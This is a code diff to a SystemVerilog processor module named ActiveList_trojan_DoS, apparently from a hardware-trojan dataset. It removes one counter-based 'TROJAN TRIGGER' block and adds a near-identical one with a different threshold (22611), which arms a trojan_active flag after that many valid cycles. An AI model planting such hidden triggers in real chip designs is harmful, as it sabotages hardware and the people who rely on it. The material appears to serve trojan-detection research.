@@ -33,24 +33,6 @@ module ActiveList_trojan_DoS(
     DebugIF.ActiveList debug
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 21430;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (valid) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
-
     //
     // --- Pointers
     //
@@ -78,6 +60,23 @@ module ActiveList_trojan_DoS(
             .headPtr(headPtr),
             .tailPtr(tailPtr)
         );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=22611)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 22611;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (valid) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
     always_comb begin
         // In the active list, recovery and allocation can be simultaneously carried out,
